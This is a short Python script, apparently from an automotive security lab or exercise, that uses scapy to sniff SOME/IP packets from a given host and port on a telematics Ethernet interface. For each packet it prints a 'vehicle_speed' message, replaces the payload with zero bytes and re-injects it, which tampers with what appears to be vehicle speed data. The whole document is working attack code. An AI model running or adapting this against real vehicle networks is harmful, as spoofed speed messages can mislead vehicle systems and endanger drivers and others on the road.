from scapy.all import *
from scapy.contrib.automotive.someip import *

import pdb

def process_packet(packet):
    if packet.haslayer(IP) and packet.haslayer(UDP):
        if packet.haslayer(SOMEIP):
            print("someip - vehicle_speed!")
            packet[SOMEIP].payload = Raw(load=b'\x00' * 12)
            sendp(packet, iface='telematics-eth0')

filter = "udp and src host 10.0.0.4 and src port 31000"
sniff(filter=filter, iface='telematics-eth0', prn=process_packet)

